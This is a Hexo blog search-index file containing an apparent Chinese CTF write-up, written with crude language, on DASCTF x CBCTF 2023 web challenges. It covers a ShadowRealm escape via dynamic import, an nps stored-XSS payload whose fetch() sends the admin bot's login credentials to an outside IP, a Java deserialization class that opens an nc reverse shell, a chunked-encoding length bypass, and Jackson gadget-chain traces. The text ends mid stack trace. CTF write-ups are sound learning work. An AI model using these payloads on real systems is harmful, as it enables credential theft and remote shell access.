{"meta":{"title":"Hexo","subtitle":"","description":"","author":"1llustrious","url":"https://1llustrious.github.io","root":"/"},"pages":[{"title":"404","text":"","path":"404/index.html","date":"11-29","excerpt":""},{"title":"search","text":"","path":"search/index.html","date":"11-29","excerpt":""}],"posts":[{"title":"","text":"DAS0RAYSxCBCTF复现DAS0RAYSxCBCTF写在前面wcsnmd,谁给👴出的这么恶心的web,nmd爆零了,tmd总共3100的解,什么√⑧玩意儿. wp:‌‍ ⁡ ⁣‌‍ ‍⁣⁢⁢ ‌‍‬ ⁣ ‌⁣⁢‌⁡⁤⁢⁤⁤‌‌⁡⁢‌‍ ⁣‌‌⁡⁣ DASCTF x CBCTF - 飞书云文档 (feishu.cn) DASCTFXCBCTF_2023_bypassJava_Wp (pankas.top) yet another box这题是一个比较新的沙箱shadowrealm,这byd和node的vm8太一样,有着自己的全局对象和内置函数,就挺抽象,没法像vm,也无法通过prototype pollution控制主模块中的内置属性另外由于与 package.json 声明了 “type”:”module” 且文件结尾为 .mjs，所采用的ESM 默认strict mode，无法通过 [stack-trace-api](Stack trace API · V8 — 堆栈跟踪 API ·V8发动机) 跨上下文取得可利用对象。 Stack trace API仅作为学习记录使用,并不为本题提供思路. 默认情况下，V8 抛出的几乎所有错误都有一个属性,抛出错误的时候会用到方法,该方法能获得到外面的全局对象. Shadow-Realm-APIWrapped Function Exotic Objects是一种奇异对象,内含一个回调函数.具有一些内置槽slot,: Internal slots Type Description [[WrappedTargetFunction]] Callable Object Stores the callable object. [[Call]] The [[Call]] internal method Executes code associated with this object’s [[WrappedTargetFunction]]. [[Realm]] Realm Record The realm in which the function was created. 还有[[Prototype]] and [[Extensible]] 对象的[[call]]方法获取两个参数:thisArgument, argumentsList .调用时会实现以下步骤: 1.设置运行代码的上下文.执行上下文通常包括执行函数的作用域、变量、this 值等信息。 2.设置新的作用域calleecontext. 3.执行assert断言,确保calleecontext是目前正在执行的上下文. 4.用result储存**OrdinaryWrappedFunctionCall(F, thisArgument, argumentsList)**的运行结果 5.calleeContext 被从执行上下文栈中移除，而 callerContext 被恢复为当前运行的执行上下文。 6.判断返回类型,如果[[TYPE]]已返回,则返回value. 7.处理异常 8.执行结束. dynamic import方案通过动态 import 允许我们按需加载 JavaScript 模块，而不会在最开始的时候就将全部模块加载。 动态 import 返回了一个 Promise 对象，这也意味着可以在 then 中等模块加载成功后去做一些操作。 所以import导入需要通过then去触发其方法. import在执行方法后仍然是promise对象,采用的类似于链式调用. 123var test = import(&quot;child_process&quot;).then(m=&gt;console.log(m)) 其中test获取promise异步对象,而m直接就获得child_process对象. exp简而言之 1ShadowRealm.prototype.evaluate =&gt; PerformShadowRealmEval =&gt; Execution Contexts 支持dynamic import “Dynamic import” 是指在 JavaScript 中动态加载模块或文件的能力。这是 ECMAScript 2020 标准的一部分，引入了 import() 函数，它可以在运行时异步加载模块。这与传统的静态 import 语句不同，后者在代码加载时即确定了要导入的模块。 12import(&#x27;child_process&#x27;).then(m=&gt;m.execSync(&#x27;/readflag &gt; /app/asserts/flag&#x27;));1; npsmd又是xss,👴又tnnd不会,しね！ 🧀一个nps网站上的xss.涉及CVE-2023-46486 项目地址 影响范围: nps&lt;&#x3D;V0.26.10 你tm搁这放屁呢,最新版本就是这个,21年最后publish了. 漏洞怎么个事: bootstrapTable并未配置escape字段,且使用时不改默认配置 kokodayo,web&#x2F;views&#x2F;client&#x2F;list.html 这里设置公钥,防止被ntr(被别人用代理),你也不希望你拿不到shell吧(bushi) 同为代理,经常被提起的frp和venom都没太注意公钥,实际上是有公钥这一选项的. 这里,我们完全就能够通过客户端去进行攻击了. 开打😓cnm,sbwindows,死活用不成,linux一下就出来了和👴😡了 √⑧玩意,当👴⭐😡吧 首先下载客户端,这一点和frp的admin端和agent端类似 然后配置客户端的配置文件 12345[common]server_addr=127.0.0.1:8024conn_type=tcpvkey=123remark=&lt;sCRiPt&gt;alert(`nps hacker`)&lt;/sCrIpT&gt; ×成功了,狠狠地×进去 remote干🤪忆!悟!这就是xss的机器人创造首先题目通过js代码造了个后台机器人,👴很喜欢 1234567891011121314151617181920212223242526272829303132333435363738394041424344import &#123;chromium, errors&#125; from &quot;playwright-chromium&quot;;const PASSWORD = &quot;DASCTF_flag&quot;;(async () =&gt; &#123; async function visit() &#123; const page = await context.newPage(); try &#123; for (let i = 0; i &lt; 3; i++)&#123; try&#123; await page.goto(&#x27;http://a.o.com:8080/client/list&#x27;); break; &#125;catch (e) &#123; console.log(e); &#125; &#125; await page.waitForTimeout(1000); const element = await page.isVisible(&#x27;button[langtag=&quot;word-login&quot;]&#x27;); if (element) &#123; await page.fill(&#x27;input[name=&quot;username&quot;]&#x27;, &#x27;admin&#x27;); await page.fill(&#x27;input[name=&quot;password&quot;]&#x27;, PASSWORD); await page.click(&#x27;button[langtag=&quot;word-login&quot;]&#x27;); &#125; await page.waitForTimeout(1000); await page.close(); &#125; catch (e) &#123; if (e instanceof errors.TimeoutError)&#123; console.log(e); await page.close(); &#125;else&#123; console.log(e); &#125; &#125; &#125; const browser = await chromium.launch(&#123; headless: true &#125;); const context = await browser.newContext(); context.setDefaultTimeout(10000); setInterval(visit, 30000);&#125;)(); 看不懂没关系,👴来带你分析一下. 首先整个就是一坨shit⛰, 通过一个箭头函数()的方式立即调用 123456const browser = await chromium.launch(&#123; headless: true &#125;); const context = await browser.newContext(); context.setDefaultTimeout(10000); setInterval(visit, 30000); 首先创建一个浏览器和上下文,然后设置setIneterval,表示每三十秒调用visit,函数,让👴看看visit函数怎么个事 123456789101112131415161718192021222324252627282930async () =&gt; &#123; async function visit() &#123; const page = await context.newPage(); try &#123; for (let i = 0; i &lt; 3; i++)&#123; try&#123; await page.goto(&#x27;http://a.o.com:8080/client/list&#x27;); break; &#125;catch (e) &#123; console.log(e); &#125; &#125; await page.waitForTimeout(1000); const element = await page.isVisible(&#x27;button[langtag=&quot;word-login&quot;]&#x27;); if (element) &#123; await page.fill(&#x27;input[name=&quot;username&quot;]&#x27;, &#x27;admin&#x27;); await page.fill(&#x27;input[name=&quot;password&quot;]&#x27;, PASSWORD); await page.click(&#x27;button[langtag=&quot;word-login&quot;]&#x27;); &#125; await page.waitForTimeout(1000); await page.close(); &#125; catch (e) &#123; if (e instanceof errors.TimeoutError)&#123; console.log(e); await page.close(); &#125;else&#123; console.log(e); &#125; &#125; &#125; 首先获取新页面,然后访问三次http://a.o.com:8080/client/list 你看看眼熟不,&#x2F;client&#x2F;list刚好就是刚才展示xss的路径,你品,你细品.这个host眼熟不,这可是在docker里面设置的地址映射啊. ならば 答えはひとつだ 就是xss,接下来就是分析这个机器人事怎么操作的了. 首先要看有无button[langtag=&quot;word-login&quot;]这玩意 那我们就需要设置一个button了,不过我们可以在这里面下点毒 1&lt;button onclick=&quot;fetch(&#x27;http://43.143.192.19:1145/&#x27;,&#123;method:&#x27;POST&#x27;,body:$(&#x27;#username&#x27;)[0].value+&#x27;___&#x27;+$(&#x27;#password&#x27;)[0].value&#125;);&quot; langtang=&gt;&lt;/button&gt; $(‘#username’) 是一个 jQuery 选择器，用于选择具有指定 id 属性的 HTML 元素。在这个选择器中，#username 表示要选择 id 为 “username” 的元素。会从输入获取 123&lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; value=&quot;flag&quot;&gt; 再根据这个 12await page.fill(&#x27;input[name=&quot;username&quot;]&#x27;, &#x27;admin&#x27;); await page.fill(&#x27;input[name=&quot;password&quot;]&#x27;, PASSWORD); 让机器人去输入我们设置好的登录框,从而通过input获取到flag. 12&lt;input name=&quot;username&quot; id=&quot;username&quot; class=&quot;form-control&quot; placeholder=&quot;Username&quot; required=&quot;&quot; langtag=&quot;word-username&quot;&gt;&lt;input name=&quot;password&quot; id=&quot;password&quot; type=&quot;password&quot; class=&quot;form-control&quot; placeholder=&quot;Password&quot; required=&quot;&quot; langtag=&quot;word-password&quot;&gt; 如此,圈套已设,只等敌军进入 1234567891011121314&lt;html&gt; &lt;head&gt;&lt;/head&gt; &lt;body&gt; &lt;form class=&quot;m-t&quot; onsubmit=&quot;return false&quot;&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;input name=&quot;username&quot; id=&quot;username&quot; class=&quot;form-control&quot; placeholder=&quot;Username&quot; required=&quot;&quot; langtag=&quot;word-username&quot;&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;input name=&quot;password&quot; id=&quot;password&quot; type=&quot;password&quot; class=&quot;form-control&quot; placeholder=&quot;Password&quot; required=&quot;&quot; langtag=&quot;word-password&quot;&gt; &lt;/div&gt; &lt;button onclick=&quot;fetch(&#x27;http://43.143.192.19:1145/&#x27;,&#123;method:&#x27;POST&#x27;,body:$(&#x27;#username&#x27;)[0].value+&#x27;___&#x27;+$(&#x27;#password&#x27;)[0].value&#125;);&quot; langtag=&quot;word-login&quot;&gt;Login&lt;/button&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 这么复杂数据传输起来不方便,👴不喜欢,换一个 expunicode就行,而且控制台大大支持unicode 12345[common]server_addr=node4.buuoj.cn:26658conn_type=tcpvkey=123remark=&lt;/a&gt;&lt;sCRiPt&gt;document.write`\\u003c\\u0068\\u0074\\u006d\\u006c\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u003c\\u0068\\u0065\\u0061\\u0064\\u003e\\u003c\\u002f\\u0068\\u0065\\u0061\\u0064\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u003c\\u0062\\u006f\\u0064\\u0079\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u0066\\u006f\\u0072\\u006d\\u0020\\u0063\\u006c\\u0061\\u0073\\u0073\\u003d\\u0022\\u006d\\u002d\\u0074\\u0022\\u0020\\u006f\\u006e\\u0073\\u0075\\u0062\\u006d\\u0069\\u0074\\u003d\\u0022\\u0072\\u0065\\u0074\\u0075\\u0072\\u006e\\u0020\\u0066\\u0061\\u006c\\u0073\\u0065\\u0022\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u0064\\u0069\\u0076\\u0020\\u0063\\u006c\\u0061\\u0073\\u0073\\u003d\\u0022\\u0066\\u006f\\u0072\\u006d\\u002d\\u0067\\u0072\\u006f\\u0075\\u0070\\u0022\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u0069\\u006e\\u0070\\u0075\\u0074\\u0020\\u006e\\u0061\\u006d\\u0065\\u003d\\u0022\\u0075\\u0073\\u0065\\u0072\\u006e\\u0061\\u006d\\u0065\\u0022\\u0020\\u0069\\u0064\\u003d\\u0022\\u0075\\u0073\\u0065\\u0072\\u006e\\u0061\\u006d\\u0065\\u0022\\u0020\\u0063\\u006c\\u0061\\u0073\\u0073\\u003d\\u0022\\u0066\\u006f\\u0072\\u006d\\u002d\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c\\u0022\\u0020\\u0070\\u006c\\u0061\\u0063\\u0065\\u0068\\u006f\\u006c\\u0064\\u0065\\u0072\\u003d\\u0022\\u0055\\u0073\\u0065\\u0072\\u006e\\u0061\\u006d\\u0065\\u0022\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064\\u003d\\u0022\\u0022\\u0020\\u006c\\u0061\\u006e\\u0067\\u0074\\u0061\\u0067\\u003d\\u0022\\u0077\\u006f\\u0072\\u0064\\u002d\\u0075\\u0073\\u0065\\u0072\\u006e\\u0061\\u006d\\u0065\\u0022\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u002f\\u0064\\u0069\\u0076\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u0064\\u0069\\u0076\\u0020\\u0063\\u006c\\u0061\\u0073\\u0073\\u003d\\u0022\\u0066\\u006f\\u0072\\u006d\\u002d\\u0067\\u0072\\u006f\\u0075\\u0070\\u0022\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u0069\\u006e\\u0070\\u0075\\u0074\\u0020\\u006e\\u0061\\u006d\\u0065\\u003d\\u0022\\u0070\\u0061\\u0073\\u0073\\u0077\\u006f\\u0072\\u0064\\u0022\\u0020\\u0069\\u0064\\u003d\\u0022\\u0070\\u0061\\u0073\\u0073\\u0077\\u006f\\u0072\\u0064\\u0022\\u0020\\u0074\\u0079\\u0070\\u0065\\u003d\\u0022\\u0070\\u0061\\u0073\\u0073\\u0077\\u006f\\u0072\\u0064\\u0022\\u0020\\u0063\\u006c\\u0061\\u0073\\u0073\\u003d\\u0022\\u0066\\u006f\\u0072\\u006d\\u002d\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c\\u0022\\u0020\\u0070\\u006c\\u0061\\u0063\\u0065\\u0068\\u006f\\u006c\\u0064\\u0065\\u0072\\u003d\\u0022\\u0050\\u0061\\u0073\\u0073\\u0077\\u006f\\u0072\\u0064\\u0022\\u0020\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0064\\u003d\\u0022\\u0022\\u0020\\u006c\\u0061\\u006e\\u0067\\u0074\\u0061\\u0067\\u003d\\u0022\\u0077\\u006f\\u0072\\u0064\\u002d\\u0070\\u0061\\u0073\\u0073\\u0077\\u006f\\u0072\\u0064\\u0022\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u002f\\u0064\\u0069\\u0076\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u0062\\u0075\\u0074\\u0074\\u006f\\u006e\\u0020\\u006f\\u006e\\u0063\\u006c\\u0069\\u0063\\u006b\\u003d\\u0022\\u0066\\u0065\\u0074\\u0063\\u0068\\u0028\\u0027\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f\\u0034\\u0033\\u002e\\u0031\\u0034\\u0033\\u002e\\u0031\\u0039\\u0032\\u002e\\u0031\\u0039\\u003a\\u0031\\u0031\\u0034\\u0035\\u002f\\u0027\\u002c\\u007b\\u006d\\u0065\\u0074\\u0068\\u006f\\u0064\\u003a\\u0027\\u0050\\u004f\\u0053\\u0054\\u0027\\u002c\\u0062\\u006f\\u0064\\u0079\\u003a\\u0024\\u0028\\u0027\\u0023\\u0075\\u0073\\u0065\\u0072\\u006e\\u0061\\u006d\\u0065\\u0027\\u0029\\u005b\\u0030\\u005d\\u002e\\u0076\\u0061\\u006c\\u0075\\u0065\\u002b\\u0027\\u005f\\u005f\\u005f\\u0027\\u002b\\u0024\\u0028\\u0027\\u0023\\u0070\\u0061\\u0073\\u0073\\u0077\\u006f\\u0072\\u0064\\u0027\\u0029\\u005b\\u0030\\u005d\\u002e\\u0076\\u0061\\u006c\\u0075\\u0065\\u007d\\u0029\\u003b\\u0022\\u0020\\u006c\\u0061\\u006e\\u0067\\u0074\\u0061\\u0067\\u003d\\u0022\\u0077\\u006f\\u0072\\u0064\\u002d\\u006c\\u006f\\u0067\\u0069\\u006e\\u0022\\u003e\\u004c\\u006f\\u0067\\u0069\\u006e\\u003c\\u002f\\u0062\\u0075\\u0074\\u0074\\u006f\\u006e\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u002f\\u0066\\u006f\\u0072\\u006d\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u003c\\u002f\\u0062\\u006f\\u0064\\u0079\\u003e\\u000a\\u003c\\u002f\\u0068\\u0074\\u006d\\u006c\\u003e`&lt;/sCrIpT&gt; 1./npc -config ./conf/npc.conf 终于拿到了艹,30s点一次,👴tm以为x不进去了 まだまだね、弱い！ Deserialize?Upload!actuator😫 首先,题目有个🚢♥的依赖,显然👴不知道这是干啥的,怎么办,学! Spring boot——Actuator 详解 - 曹伟雄 - 博客园 (cnblogs.com) 配置方面 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt; 有了这个依赖,那么Spring就会自动开放/actuator/health和/actuator/info这两个路径 访问[127.0.0.1:9090/actuator/](http://127.0.0.1:9090/actuator/),可以得到&#x2F;acturator的路由 1234567891011121314151617181920212223242526272829303132&#123; &quot;_links&quot;: &#123; &quot;self&quot;: &#123; &quot;href&quot;: &quot;http://127.0.0.1:9090/actuator&quot;, &quot;templated&quot;: false &#125;, &quot;health&quot;: &#123; &quot;href&quot;: &quot;http://127.0.0.1:9090/actuator/health&quot;, &quot;templated&quot;: false &#125;, &quot;health-path&quot;: &#123; &quot;href&quot;: &quot;http://127.0.0.1:9090/actuator/health/&#123;*path&#125;&quot;, &quot;templated&quot;: true &#125;, &quot;info&quot;: &#123; &quot;href&quot;: &quot;http://127.0.0.1:9090/actuator/info&quot;, &quot;templated&quot;: false &#125;, &quot;env&quot;: &#123; &quot;href&quot;: &quot;http://127.0.0.1:9090/actuator/env&quot;, &quot;templated&quot;: false &#125;, &quot;env-toMatch&quot;: &#123; &quot;href&quot;: &quot;http://127.0.0.1:9090/actuator/env/&#123;toMatch&#125;&quot;, &quot;templated&quot;: true &#125;, &quot;heapdump&quot;: &#123; &quot;href&quot;: &quot;http://127.0.0.1:9090/actuator/heapdump&quot;, &quot;templated&quot;: false &#125; &#125;&#125; 以下是一些经常使用的路径 HTTP方法 Endpoint Description GET &#x2F;actuator 查看有哪些路径 GET &#x2F;actuator&#x2F;env 查看所有环境属性,看Spring的的properties,但是会自动脱敏掉一些secret key等敏感信息 GET &#x2F;actuator&#x2F;health 查看运行指标 GET &#x2F;actuator&#x2F;info 查看 properties 中 info 开头的属性，沒啥用 GET &#x2F;actuator&#x2F;heapdump 获取JVM的heap dump 🤣默认Actuator /actuator/health和/actuator/info两个 endpoint，如果要开放其他 endpoint 的話，需在在 application.properties 中做设置。 Heap dump（堆转储）是指将一个 Java 进程的内存中的对象信息和数据结构以二进制格式写入文件，以便进行内存分析和排查内存泄漏等问题。Heap dump 包含了 Java 堆内存中的对象实例、对象引用关系、类信息等，它是诊断和调试 Java 应用程序的重要工具之一。 👴说点人话:反正Heap dump事内存相关的东西,肯定有敏感信息,👴就是要把它下下来进行一通乱超,不知道你们怎么忍得住的,事👴直接拿起来狠狠地分析. 怎么分析,当时事用jdk自带的jhat 1jhat -J-Xmx512M &quot;/path/to/heapdump&quot; 然后就会本地起一个服务器,里面就加载内存的内容 md,依托✍特, 1234public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception &#123; ((HttpSecurity)((FormLoginConfigurer)((FormLoginConfigurer)((HttpSecurity)((ExpressionUrlAuthorizationConfigurer.AuthorizedUrl)((ExpressionUrlAuthorizationConfigurer.AuthorizedUrl)http.authorizeRequests().antMatchers(new String[]&#123;&quot;/&quot;&#125;)).permitAll().antMatchers(new String[]&#123;&quot;/admin/**&quot;&#125;)).authenticated().and()).formLogin().loginProcessingUrl(&quot;/login&quot;)).permitAll()).and()).csrf().disable(); return (SecurityFilterChain)http.build(); &#125; 🧀spring安全配置,http.authorizeRequests().antMatchers(new String[]&#123;&quot;/&quot;&#125;).permitAll()表示对&#x2F;路由访问允许任意用户, antMatchers(new String[]&#123;&quot;/admin/**&quot;&#125;).authenticated()表示/admin/开头验证用户 .formLogin().loginProcessingUrl(&quot;/login&quot;).permitAll()&#x2F;login的表达登录不需要验证 这里就是让👴拿到password 题目实践😓😡wcsndm,sb东西,题目环境没了,行吧,👴本地搭一个,nmd套模板整了个docker-compose,告诉👴nmdproject name must not be empty,你tmd倒是告诉👴哪里没有project name,阿米诺斯,一格德拉米. 只能手动docker build. 同样拿到heapdump 直接打开 1jvisualvm 别问👴哪里装,这nmjava自带的 进行一波OQL查询 1select s from java.util.LinkedHashMap$Entry s where /spring.security.user.password/.test(s.key) 这里用的事正则测试 &#x2F;rgexp&#x2F;.test()的形式,虽然里面内容没用到啥正则,只是走个形式而已,别问👴为啥不直接查value,nmd value是个对象还未知,你查个√⑧. tmd &#x2F;login登进去,让👴看看怎么个事 源赖氏一个后台管理系统,能用文件上传功能的地方. 反序列化分析😛1234567@GetMapping(&#123;&quot;/deserialize&quot;&#125;) public void deserialize(@RequestParam(&quot;b64str&quot;) String b64str) throws Exception &#123; byte[] serialized = Base64.getDecoder().decode(b64str); ByteArrayInputStream bis = new ByteArrayInputStream(serialized); SafeObjectInputStream ois = new SafeObjectInputStream(bis); ois.readObject(); &#125; 很美好对吧,jackson链直接打,但是👴发现了不对劲,md有毒 还是看看远处的SafeObjectInputStream吧 123456789101112131415161718public SafeObjectInputStream(InputStream is) throws Exception &#123; super(is); &#125; protected Class&lt;?&gt; resolveClass(ObjectStreamClass input) throws IOException, ClassNotFoundException &#123; if (BLACKLIST.contains(input.getName())) &#123; throw new SecurityException(&quot;Hacker!!&quot;); &#125; else &#123; return super.resolveClass(input); &#125; &#125; static &#123; BLACKLIST.add(&quot;com.fasterxml.jackson.databind.node.POJONode&quot;); BLACKLIST.add(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;); BLACKLIST.add(&quot;java.lang.Runtime&quot;); BLACKLIST.add(&quot;java.security.SignedObject&quot;); &#125; 都给你ban了,rnm,出题人真的阴险,现在不把jackson链ban了,都不敢反序列化了是吧😅 怎么绘世呢 文件上传+反序列化组合拳😤题目给了文件上传的功能,那总不能不用吧,要不然题目整这β÷玩意干嘛呀.😅 正好前面通过env泄露得知java_home的位置 什么,你不知道java_home事干嘛的? 来,跟👴一起念: JAVA_HOME 是一个环境变量，用于指示 Java 开发工具和应用程序在计算机上的安装位置。它主要用于以下几个方面的作用： Java 开发工具的定位：JAVA_HOME 变量告诉计算机的操作系统和其他开发工具 Java 开发工具的安装位置。这对于编译、运行和调试 Java 程序非常重要。例如，当你使用 Java 编译器 (javac) 编译 Java 代码时，系统需要知道 JAVA_HOME 的位置以找到 javac 可执行文件。 Java 运行时环境（JRE）的定位：除了开发工具，JAVA_HOME 也可以用于定位 Java 运行时环境（JRE）的位置。JRE 包含了运行 Java 应用程序所需的类库和运行时组件。如果你的系统上有多个不同版本的 Java 安装，设置 JAVA_HOME 可以确保你使用的是正确的 Java 版本。 应用程序的定位：某些 Java 应用程序可能需要知道 Java 的安装位置，以便正确配置自己。通过设置 JAVA_HOME 环境变量，这些应用程序可以轻松找到所需的 Java 运行时环境。 开发工具和构建工具的配置：许多 Java 集成开发环境（IDE）和构建工具（如 Maven 和 Gradle）使用 JAVA_HOME 变量来配置其内部使用的 Java 环境。这有助于确保项目在正确的 Java 版本下编译和运行。 跨平台兼容性：通过使用 JAVA_HOME 变量，可以使 Java 开发环境在不同的操作系统上更具可移植性。它允许开发人员编写一次代码，然后在不同平台上使用相同的 JAVA_HOME 变量来运行代码。 总之，JAVA_HOME 是一个关键的环境变量，用于确保计算机上的 Java 开发工具、应用程序和运行时环境能够正确地找到和使用 Java 安装。它在 Java 开发和部署过程中起到重要作用，特别是在多版本 Java 安装和跨平台开发的情况下。 不说人话就是这样,这是伟大的ChatGPT说的,👴翻译一下就是,运行脚本的位置在那,要运行的class也在那,所以有啥class放那,他就能加载啥class. 所以接下来要干啥懂了没,上传点具有攻击性的class到javahome里面,狠狠地入它一波. 而且不是有反序列化吗,到这你不可能还不知道吧,创造一个反序列化带有直接恶意操作的类,直接getshell😊 12345678910111213141516171819202122import java.io.*;public class exp implements Serializable &#123; private void readObject(ObjectInputStream in) throws InterruptedException, IOException, ClassNotFoundException &#123; in.defaultReadObject(); Process p = Runtime.getRuntime().exec(new String[]&#123;&quot;nc&quot;,&quot;43.143.192.19&quot;,&quot;1145&quot;,&quot;-e&quot;,&quot;/bin/sh&quot;&#125;); InputStream is = p.getInputStream(); BufferedReader reader = new BufferedReader(new InputStreamReader(is)); p.waitFor(); if(p.exitValue()!=0)&#123; &#125; String s = null; while((s=reader.readLine())!=null)&#123; System.out.println(s); &#125; &#125;&#125; 写个exp类,编译好后再上传,别直接sb到把java上传了 但是👴不太高兴,因为有点bug,第一次搭docker打不成,第二次终出了😒. DASCTFXCBCTF_2023_bypassJava真tm恶心的java题,不仅有绕过,还tm有RASP这种抽象的东西,👴太弱了,👴要学. 题目环境甚至不是靶机,而是静态资源,很不爽. 还好出题人开源了:pankass&#x2F;DASCTF_X_CBCTF2023_bypassJava: 题目源码和docker环境 (github.com) Content-Length限制不多说,第一时间想到jackson链子,但是有长度限制 这长度限制是人能想出来的吗😓,nm稍微大一点,随便不都得几千? 过不了,根本过不了,让我看看bypass怎么个事: 这里如果头部有transfer-encoding,就会进addInputFilter 这里面如果有chunked,那么就会设置成this.contentDelimitation为true 最后这里就会进入if,从而设置ContentLength为-1,绕过长度限制. chuncked编码怎么发分块编码（Transfer-Encoding: chunked） - 妙音天女 - 博客园 (cnblogs.com) 简单看一下们大概就是 123456十六进制长度/r/n content/r/n .... 0/r/n /r/n 每一块都是十六进制表示长度然后,/r/n 接着输入content,然后/r/n 最后一块一定要输入0/r/n/r/n 👴浅浅写个脚本 1234567891011121314import requestsurl = &quot;http://127.0.0.1:8080/read&quot;content = open(&quot;data.txt&quot;,&quot;r&quot;).read()leng = hex(len(content)).replace(&quot;0x&quot;,&quot;&quot;)body = leng+&quot;\\r\\n&quot;+content+&quot;\\r\\n0\\r\\n\\r\\n&quot;print(body)headers= &#123;&quot;transfer-encoding&quot;:&quot;chunked&quot;&#125;res = requests.post(url=url,data=body,headers=headers) soeasy,🤣, 然而这只是第一步,👴现场甚至第一步都没过去. 内存马读文件不稳定jackson链问题关于java反序列化中jackson链子不稳定问题 (pankas.top) 从JSON1链中学习处理JACKSON链的不稳定性 - 先知社区 (aliyun.com) 👴ctmd打jackson链子的时候,有史以来第一次遇见了陌生的报错 1com.fasterxml.jackson.databind.JsonMappingException: (was java.lang.NullPointerException) (through reference chain: com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl[&quot;stylesheetDOM&quot;]) 且经过本地调试,似乎进入了陌生的代码段,👴很不乐意. 具体来说,就是在调用getters的时候,优先奏了getStylesheetDOM这个方法,但是,众所周知,我们在序列化的时候,是不会去设置这个值的,所以理所应当的,nmd空指针了.😓😅而当其调用 getter 方法时优先调用 getOutputProperties 方法时才是我们正常想要的结果。 这nm真有坑啊,比赛想打这条链子,不说ban位问题,nmd这问题也只能通过不停地重置靶机解决了,比赛你重置靶机,静态地址等似吧. 现在👴来分析一下怎么个事,优化一下 流程这条链子分析👴不想说了,闭着眼睛都知道怎么个事. 关键是触发POJONode的toString方法,然后内部经过一系列序列化器调用 POJONode 中封的 _value 属性的 getter 方法，从而调用 TemplatesImpl类型对象的 getOutputProperties 方法从而导致执行任意代码。 重点就是从toString到getters的调用这一过程 栈调试放在这: 1234567891011121314151617181920getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:498, Method (java.lang.reflect)serializeAsField:689, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)serializeFields:774, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)serialize:178, BeanSerializer (com.fasterxml.jackson.databind.ser)defaultSerializeValue:1142, SerializerProvider (com.fasterxml.jackson.databind)serialize:115, POJONode (com.fasterxml.jackson.databind.node)serialize:39, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)serialize:20, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)_serialize:480, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)serializeValue:319, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)serialize:1518, ObjectWriter$Prefetch (com.fasterxml.jackson.databind)_writeValueAndClose:1219, ObjectWriter (com.fasterxml.jackson.databind)writeValueAsString:1086, ObjectWriter (com.fasterxml.jackson.databind)nodeToString:30, InternalNodeMapper (com.fasterxml.jackson.databind.node)toString:136, BaseJsonNode (com.fasterxml.jackson.databind.node) 在 com.fasterxml.jackson.databind.ser.BeanPropertyWriter#serializeAsField 方法中利用反射来执行其 getters 方法 这次就调用了getoutputProperties,很好,👴喜欢🤪 那就往前看看哪里获取了getters 在com.fasterxml.jackson.databind.ser.std.BeanSerializerBase#serializeFields中,prop数组存储了getters,通过循环遍历所有getters并调用serializeAsField 追踪一下这个变量,从 _props获得 最终在com.fasterxml.jackson.databind.introspect赋值 12345678910111213141516171819202122collectAll:418, POJOPropertiesCollector (com.fasterxml.jackson.databind.introspect)getJsonValueAccessor:270, POJOPropertiesCollector (com.fasterxml.jackson.databind.introspect)findJsonValueAccessor:258, BasicBeanDescription (com.fasterxml.jackson.databind.introspect)findSerializerByAnnotations:391, BasicSerializerFactory (com.fasterxml.jackson.databind.ser)_createSerializer2:224, BeanSerializerFactory (com.fasterxml.jackson.databind.ser)createSerializer:173, BeanSerializerFactory (com.fasterxml.jackson.databind.ser)_createUntypedSerializer:1495, SerializerProvider (com.fasterxml.jackson.databind)_createAndCacheUntypedSerializer:1443, SerializerProvider (com.fasterxml.jackson.databind)findValueSerializer:544, SerializerProvider (com.fasterxml.jackson.databind)findTypedValueSerializer:822, SerializerProvider 